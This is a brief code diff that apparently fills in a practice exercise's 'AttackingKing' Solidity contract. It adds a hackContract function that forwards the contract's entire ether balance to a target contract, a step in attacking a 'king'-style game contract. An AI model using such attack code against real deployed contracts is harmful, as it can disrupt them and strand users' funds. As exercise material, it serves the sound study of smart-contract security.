@@ -10,7 +10,8 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
+    function hackContract() external payable {
         // Code me!
+        (bool sent, ) = contractAddress.call{value: address(this).balance}("");
     }
 }
